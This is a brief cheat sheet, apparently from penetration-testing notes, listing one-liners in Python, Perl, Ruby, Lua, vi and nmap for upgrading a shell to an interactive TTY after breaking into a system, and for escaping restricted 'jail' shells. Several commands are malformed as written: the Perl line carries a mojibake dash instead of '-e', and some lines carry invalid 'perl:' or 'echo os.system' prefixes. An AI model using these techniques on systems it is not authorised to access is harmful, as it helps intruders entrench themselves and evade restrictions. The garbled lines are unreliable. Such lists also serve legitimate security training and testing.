# Spawning a TTY Shell

Different ways to spawn a tty shell once you get in and you get an error sying its not a tty shell.


## Python
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
## Basic tools
```
echo os.system('/bin/bash')
```
```
/bin/sh -i
```
(From within vi)
```
:!bash
```
```
:set shell=/bin/bash:shell
```
(From within nmap)
```
!sh
```
## Perl
```
perl â€”e 'exec "/bin/sh";'
```
```
perl: exec "/bin/sh";
```
## Ruby
```
ruby: exec "/bin/sh"
```
(From within IRB)
```
exec "/bin/sh"
```
## Lua
```
lua: os.execute('/bin/sh')
```
Many of these will also allow you to escape jail shells. The top 3 would be my most successful in general for spawning from the command line.
